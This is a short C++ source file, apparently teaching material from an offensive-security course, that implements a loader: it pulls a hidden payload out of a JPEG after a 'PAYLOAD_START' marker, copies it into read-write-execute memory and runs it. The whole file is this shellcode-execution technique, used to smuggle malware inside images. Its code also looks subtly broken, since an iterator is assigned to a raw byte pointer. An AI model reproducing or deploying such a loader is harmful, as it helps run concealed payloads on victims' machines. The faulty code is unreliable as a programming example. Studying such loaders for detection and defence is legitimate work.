// Filename: img_payload_reader.cpp
// Purpose: Extract and execute hidden payload inside image using marker or offset.
// Instructor: Joas A Santos - https://www.linkedin.com/in/joas-antonio-dos-santos - https://github.com/CyberSecurityUP

#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>

std::vector<BYTE> ExtractPayloadFromImage(const std::string& filename) {
    std::ifstream file(filename, std::ios::binary);
    std::vector<BYTE> payload;

    if (!file) return payload;

    file.seekg(0, std::ios::end);
    size_t size = file.tellg();
    file.seekg(0, std::ios::beg);

    payload.resize(size);
    file.read((char*)payload.data(), size);
    file.close();

    const char* marker = "PAYLOAD_START";
    BYTE* start = std::search(payload.begin(), payload.end(), marker, marker + strlen(marker));
    if (start == payload.end()) return {};

    return std::vector<BYTE>(start + strlen(marker), payload.end());
}

int main() {
    auto sc = ExtractPayloadFromImage("cat_with_payload.jpg");
    if (sc.empty()) {
        std::cerr << "Payload not found.\n";
        return 1;
    }

    void* exec = VirtualAlloc(0, sc.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, sc.data(), sc.size());
    ((void(*)())exec)();

    return 0;
}
